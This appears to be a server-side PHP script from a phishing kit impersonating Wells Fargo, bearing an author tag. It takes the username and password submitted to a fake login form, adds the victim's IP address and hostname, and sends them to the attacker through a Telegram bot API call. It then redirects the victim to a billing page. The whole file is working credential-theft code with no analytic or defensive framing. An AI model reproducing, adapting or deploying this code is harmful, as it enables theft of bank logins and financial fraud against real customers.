<?php
session_start();
include "../config.php";
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$msg .= "💜 𝘕𝘦𝘸 𝘝𝘪𝘤𝘵𝘪𝘮 𝘞𝘦𝘭𝘭𝘴 𝘍𝘢𝘳𝘨𝘰 💜";
$msg .= "\n";
$msg .= "𝑼𝒔𝒆𝒓𝒏𝒂𝒎𝒆: ".$_POST['j_username']."\n";
$msg .= "𝑷𝒂𝒔𝒔𝒘𝒐𝒓𝒅: ".$_POST['j_password']."\n";
$msg .= "\n";
$msg .= "IP: ".$ip."\n";
$msg .= "HostName : ".$hostname."\n";
$msg .= "📝 Created By @z0nekk 📝\n";

file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($msg)."" );


header("Location: billing.php");  	  
?>


